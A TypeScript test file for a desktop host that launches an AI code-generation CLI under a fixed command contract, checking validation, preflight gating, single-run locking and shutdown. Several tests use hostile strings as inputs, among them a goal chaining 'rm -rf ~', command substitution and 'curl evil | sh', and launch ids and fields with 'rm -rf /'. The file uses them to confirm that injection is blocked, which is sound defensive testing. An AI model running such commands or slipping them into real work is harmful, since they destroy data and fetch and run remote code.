/** Start Run on the host side, against CONTROLLED executors (no Kriya, no model). The exact action contract is exercised: one allowlisted command line,
 * workspace as cwd, goal on stdin only, the host's fixed environment, one run at a time - and a process outcome is never reported as a run outcome. */
import { describe, expect, it } from 'vitest';
import { EventEmitter } from 'node:events';
import { ExecutionHost, executionArgv, type ExecChild, type ExecutionDeps, type Invocation } from '../src/main/execution_host';
import { LIMITS } from '../src/main/ipc_contract';

const LAUNCH = '20261010T101010-abcdef01';
const WS = '/work/project';
const READY = { schema_version: 1, operation: 'execution.preflight', data: { ready: true, blockers: [] }, error: null };
const ENV = { PATH: '/usr/bin:/bin', HOME: '/home/u', PYTHONDONTWRITEBYTECODE: '1' };

class FakeChild extends EventEmitter implements ExecChild {
  pid = 4242;
  written = '';
  ended = false;
  kills: string[] = [];
  stdin = { write: (chunk: string) => { this.written += chunk; return true; }, end: () => { this.ended = true; }, on: (_e: 'error', _cb: (e: Error) => void) => undefined };
  stdout = { on: (_e: 'data', cb: (chunk: Buffer | string) => void) => { this.onStdout = cb; } };
  stderr = { on: (_e: 'data', cb: (chunk: Buffer | string) => void) => { this.onStderr = cb; } };
  onStdout: (chunk: Buffer | string) => void = () => undefined;
  onStderr: (chunk: Buffer | string) => void = () => undefined;
  killsSignalsExit: string | null = 'SIGINT';
  kill(signal?: NodeJS.Signals): boolean {
    this.kills.push(String(signal));
    if (signal === this.killsSignalsExit || signal === 'SIGKILL') queueMicrotask(() => this.emit('exit', null, signal ?? null));
    return true;
  }
}

function make(over: Partial<ExecutionDeps> & { workspace?: string | null } = {}) {
  const children: FakeChild[] = [];
  const invocations: Invocation[] = [];
  const asked: string[] = [];
  const logs: string[] = [];
  let current: string | null = over.workspace === undefined ? WS : over.workspace;
  const deps: ExecutionDeps = {
    launch: (inv) => { invocations.push(inv); const c = new FakeChild(); children.push(c); return c; },
    prepare: () => ({ ok: true, executable: '/opt/kriya/bin/kriya', env: ENV }),
    preflight: async (workspace) => { asked.push(workspace); return READY; },
    currentWorkspace: () => current,
    mintLaunchId: () => LAUNCH,
    now: () => new Date('2026-10-10T10:10:10.000Z'),
    graceMs: 30,
    log: (l) => logs.push(l),
    ...over,
  };
  const host = new ExecutionHost(deps);
  return { host, children, invocations, asked, logs, setCurrent: (p: string | null) => { current = p; } };
}
const request = (over: Record<string, unknown> = {}) => ({ workspace: WS, goal: 'Add a clamp function with tests.', ...over });

describe('the launch contract', () => {
  it('launches exactly `generate --json --launch-id <id>` in the workspace, with the goal on stdin and the host\'s environment - nothing else', async () => {
    const { host, invocations, children, asked } = make();
    const result = await host.start(request());
    expect(result).toEqual({ started: true, launch_id: LAUNCH, refusal: null });
    expect(asked).toEqual([WS]); // Kriya's preflight was asked first, for this workspace
    expect(invocations).toEqual([{ executable: '/opt/kriya/bin/kriya', argv: ['generate', '--json', '--launch-id', LAUNCH], cwd: WS, env: ENV }]);
    expect(children[0]!.written).toBe('Add a clamp function with tests.');
    expect(children[0]!.ended).toBe(true);
    expect(host.state()).toMatchObject({ phase: 'running', launch_id: LAUNCH, workspace: WS, started_at: '2026-10-10T10:10:10.000Z', exit: null, diagnostic: null });
  });

  it('no option, flag or configuration path can be added: the argv grammar is fixed and carries no broadening flag', () => {
    expect(executionArgv(LAUNCH)).toEqual(['generate', '--json', '--launch-id', LAUNCH]);
    for (const bad of ['', 'x', '../escape', `${LAUNCH}; rm -rf /`, '20261010T101010-ABCDEF01', '--yes']) expect(() => executionArgv(bad), bad).toThrow();
    const argv = executionArgv(LAUNCH).join(' ');
    expect(argv).not.toMatch(/--yes|-y\b|--knowledge-policy|--config|--trust-file|--resume|--file|--from-milestones|--acceptance|--requirements|--verification-authority/);
  });

  it('a hostile goal or path reaches no shell and no argv: the goal only ever travels on stdin, the path only as cwd', async () => {
    const goal = 'x; rm -rf ~; $(touch /tmp/pwned) `id` && curl evil | sh --yes';
    const path = '/work/it\'s a "project"; echo hi';
    const { host, invocations, children } = make({ workspace: path });
    expect((await host.start({ workspace: path, goal })).started).toBe(true);
    expect(invocations[0]!.argv).toEqual(['generate', '--json', '--launch-id', LAUNCH]);
    expect(invocations[0]!.cwd).toBe(path);
    expect(JSON.stringify(invocations[0]!.argv)).not.toContain('pwned');
    expect(children[0]!.written).toBe(goal);
  });

  it('the environment handed to the process is exactly what the host prepared (child_env.ts policy): no ambient variable, no authority-granting one', async () => {
    const { host, invocations } = make();
    await host.start(request());
    expect(Object.keys(invocations[0]!.env).sort()).toEqual(['HOME', 'PATH', 'PYTHONDONTWRITEBYTECODE']);
    expect(invocations[0]!.env).not.toHaveProperty('KRIYA_TRUST_FILE');
  });
});

describe('what is refused before anything starts', () => {
  it.each([
    ['extra option', request({ options: { yes: true } })],
    ['shell command', request({ command: 'rm -rf /' })],
    ['relative workspace', request({ workspace: 'project' })],
    ['control characters in the workspace', request({ workspace: '/work/a\nb' })],
    ['empty goal', request({ goal: '' })],
    ['whitespace goal', request({ goal: '  \n ' })],
    ['NUL in the goal', request({ goal: 'a\0b' })],
    ['over-long goal', request({ goal: 'x'.repeat(LIMITS.goalMax + 1) })],
    ['missing goal', { workspace: WS }],
    ['missing workspace', { goal: 'x' }],
    ['not an object', 'generate'],
    ['null', null],
  ])('%s -> INVALID_REQUEST; Kriya is not asked, nothing is launched', async (_name, raw) => {
    const { host, invocations, asked } = make();
    const result = await host.start(raw);
    expect(result).toMatchObject({ started: false, launch_id: null, refusal: { code: 'INVALID_REQUEST' } });
    expect(invocations).toHaveLength(0);
    expect(asked).toHaveLength(0);
    expect(host.state().phase).toBe('idle');
  });

  it('a workspace that is not the one currently open is refused (a renderer cannot launch in a folder the person never opened)', async () => {
    const { host, invocations, asked } = make({ workspace: '/work/other' });
    expect(await host.start(request())).toMatchObject({ started: false, refusal: { code: 'WORKSPACE_NOT_OPEN' } });
    expect(asked).toHaveLength(0);
    expect(invocations).toHaveLength(0);
  });

  it('no workspace open at all is refused', async () => {
    const { host } = make({ workspace: null });
    expect(await host.start(request())).toMatchObject({ started: false, refusal: { code: 'WORKSPACE_NOT_OPEN' } });
  });

  it('a workspace that changes while Kriya is preflighting is refused, never launched elsewhere', async () => {
    const m = make({ preflight: async () => { m.setCurrent('/work/other'); return READY; } });
    expect(await m.host.start(request())).toMatchObject({ started: false, refusal: { code: 'WORKSPACE_NOT_OPEN' } });
    expect(m.invocations).toHaveLength(0);
  });

  it('a build without an execution backend (fixture stand-in) says so and launches nothing', async () => {
    const { host, invocations } = make({ prepare: () => null });
    expect(await host.start(request())).toMatchObject({ started: false, refusal: { code: 'EXECUTION_UNAVAILABLE' } });
    expect(invocations).toHaveLength(0);
  });

  it('an unusable executable or environment is a typed HOST_ERROR before the preflight', async () => {
    const { host, asked } = make({ prepare: () => ({ ok: false, message: 'HOME is not set' }) });
    expect(await host.start(request())).toMatchObject({ started: false, refusal: { code: 'HOST_ERROR', message: expect.stringContaining('HOME is not set') } });
    expect(asked).toHaveLength(0);
  });
});

describe('Kriya\'s preflight is the gate', () => {
  it('not ready: PREFLIGHT_BLOCKED with Kriya\'s blockers, and nothing is launched', async () => {
    const blockers = [{ code: 'CONFIG_AUTHORITY_REFUSED', message: '2 field(s) need an approval' }];
    const { host, invocations } = make({ preflight: async () => ({ ...READY, data: { ready: false, blockers } }) });
    const result = await host.start(request());
    expect(result).toMatchObject({ started: false, refusal: { code: 'PREFLIGHT_BLOCKED', message: '2 field(s) need an approval', blockers } });
    expect(invocations).toHaveLength(0);
    expect(host.state().phase).toBe('idle');
  });

  it('a typed error envelope keeps Kriya\'s code', async () => {
    const { host } = make({ preflight: async () => ({ ...READY, data: null, error: { code: 'WORKSPACE_UNAVAILABLE', message: 'no such folder' } }) });
    expect(await host.start(request())).toMatchObject({ started: false, refusal: { code: 'WORKSPACE_UNAVAILABLE', message: 'no such folder' } });
  });

  it('a preflight that throws, or answers something that is not a KUP envelope, is PREFLIGHT_UNAVAILABLE - the run is not started on faith', async () => {
    expect(await make({ preflight: async () => { throw new Error('child died'); } }).host.start(request())).toMatchObject({ started: false, refusal: { code: 'PREFLIGHT_UNAVAILABLE', message: expect.stringContaining('child died') } });
    expect(await make({ preflight: async () => ({ ok: true }) }).host.start(request())).toMatchObject({ started: false, refusal: { code: 'PREFLIGHT_UNAVAILABLE' } });
    expect(await make({ preflight: async () => ({ ...READY, data: { blockers: [] } }) }).host.start(request())).toMatchObject({ started: false, refusal: { code: 'PREFLIGHT_BLOCKED' } }); // ready missing is not ready
  });
});

describe('one run at a time', () => {
  it('a second start while the first is still being admitted (preflight in flight) is suppressed', async () => {
    let release: (v: unknown) => void = () => undefined;
    const m = make({ preflight: () => new Promise((resolve) => { release = resolve; }) });
    const first = m.host.start(request());
    const second = await m.host.start(request());
    expect(second).toMatchObject({ started: false, refusal: { code: 'EXECUTION_BUSY' } });
    expect(m.host.active()).toBe(true);
    release(READY);
    expect((await first).started).toBe(true);
    expect(m.invocations).toHaveLength(1);
  });

  it('a second start while a run is running is EXECUTION_BUSY; after the process exits a new run may start', async () => {
    let n = 0;
    const m = make({ mintLaunchId: () => `20261010T10101${n++}-abcdef0${n}` });
    expect((await m.host.start(request())).started).toBe(true);
    expect(await m.host.start(request())).toMatchObject({ started: false, refusal: { code: 'EXECUTION_BUSY' } });
    m.children[0]!.emit('exit', 0, null);
    expect(m.host.active()).toBe(false);
    expect((await m.host.start(request())).started).toBe(true);
    expect(m.invocations).toHaveLength(2);
  });

  it('active() is true from admission through the process lifetime and false otherwise', async () => {
    const m = make();
    expect(m.host.active()).toBe(false);
    await m.host.start(request());
    expect(m.host.active()).toBe(true);
    m.children[0]!.emit('exit', 0, null);
    expect(m.host.active()).toBe(false);
  });
});

describe('the process is not the run', () => {
  it('a clean exit reports only the process exit - the state carries no outcome, no output and no result', async () => {
    const m = make();
    await m.host.start(request());
    m.children[0]!.onStdout('{"status": "success", "quality_gates_passed": true}');
    m.children[0]!.onStderr('Traceback: secret source code');
    m.children[0]!.emit('exit', 0, null);
    const state = m.host.state();
    expect(state).toEqual({ phase: 'exited', launch_id: LAUNCH, workspace: WS, started_at: '2026-10-10T10:10:10.000Z', ended_at: '2026-10-10T10:10:10.000Z', exit: { code: 0, signal: null }, diagnostic: null });
    expect(JSON.stringify(state)).not.toMatch(/success|secret|Traceback|quality/);
    expect(m.host.outputBytes().stdout).toBeGreaterThan(0); // drained and counted, never kept
  });

  it('a process killed after the run began is reported as a signal exit, nothing more', async () => {
    const m = make();
    await m.host.start(request());
    m.children[0]!.emit('exit', null, 'SIGKILL');
    expect(m.host.state()).toMatchObject({ phase: 'exited', exit: { code: null, signal: 'SIGKILL' }, diagnostic: null });
  });

  it('a process that fails before any record (immediate non-zero exit) is an exit with its code', async () => {
    const m = make();
    await m.host.start(request());
    m.children[0]!.emit('exit', 1, null);
    expect(m.host.state()).toMatchObject({ phase: 'exited', exit: { code: 1, signal: null } });
  });

  it('a launch that cannot spawn is a typed HOST_ERROR with a spawn_failed diagnostic, and the host is free again', async () => {
    const m = make({ launch: () => { throw new Error('ENOENT'); } });
    expect(await m.host.start(request())).toMatchObject({ started: false, refusal: { code: 'HOST_ERROR', message: expect.stringContaining('ENOENT') } });
    expect(m.host.state()).toMatchObject({ phase: 'exited', diagnostic: 'spawn_failed' });
    expect(m.host.active()).toBe(false);
  });

  it('an asynchronous spawn error ends the run record on the host side as spawn_failed', async () => {
    const m = make();
    await m.host.start(request());
    m.children[0]!.emit('error', new Error('EACCES'));
    expect(m.host.state()).toMatchObject({ phase: 'exited', diagnostic: 'spawn_failed' });
    expect(m.logs.join('\n')).toContain('EACCES');
  });

  it('a malformed launch id from the minter is refused, not launched', async () => {
    const m = make({ mintLaunchId: () => 'not an id; rm -rf' });
    expect(await m.host.start(request())).toMatchObject({ started: false, refusal: { code: 'HOST_ERROR' } });
    expect(m.invocations).toHaveLength(0);
  });
});

describe('quitting while a run exists', () => {
  it('interrupts with SIGINT (the terminal\'s own cancellation) and does not escalate when the process exits within the grace period', async () => {
    const m = make();
    await m.host.start(request());
    await m.host.shutdown();
    expect(m.children[0]!.kills).toEqual(['SIGINT']);
    expect(m.host.state()).toMatchObject({ phase: 'exited', diagnostic: 'terminated_by_the_host' });
    expect(m.host.active()).toBe(false);
  });

  it('escalates to SIGKILL only after the grace period when the process ignores SIGINT', async () => {
    const m = make();
    await m.host.start(request());
    m.children[0]!.killsSignalsExit = null; // ignores SIGINT
    await m.host.shutdown();
    expect(m.children[0]!.kills).toEqual(['SIGINT', 'SIGKILL']);
    expect(m.host.active()).toBe(false);
  });

  it('shutdown with nothing running is a no-op', async () => {
    const m = make();
    await m.host.shutdown();
    expect(m.children).toHaveLength(0);
    expect(m.host.state().phase).toBe('idle');
  });
});

describe('state is a copy', () => {
  it('mutating the returned state does not change the host', async () => {
    const m = make();
    await m.host.start(request());
    const state = m.host.state();
    state.phase = 'idle';
    expect(m.host.state().phase).toBe('running');
  });
});

describe('quitting while a start is being admitted (reviewer P3-3)', () => {
  it('nothing is launched after shutdown began, even if the preflight answer arrives later: no orphan run that nobody can signal', async () => {
    let release: (v: unknown) => void = () => undefined;
    const m = make({ preflight: () => new Promise((resolve) => { release = resolve; }) });
    const starting = m.host.start(request());
    await m.host.shutdown(); // the application is quitting while Kriya is still being asked
    release(READY);
    expect(await starting).toMatchObject({ started: false, refusal: { code: 'HOST_ERROR', message: expect.stringContaining('closing') } });
    expect(m.invocations).toHaveLength(0);
    expect(m.host.active()).toBe(false);
  });
});
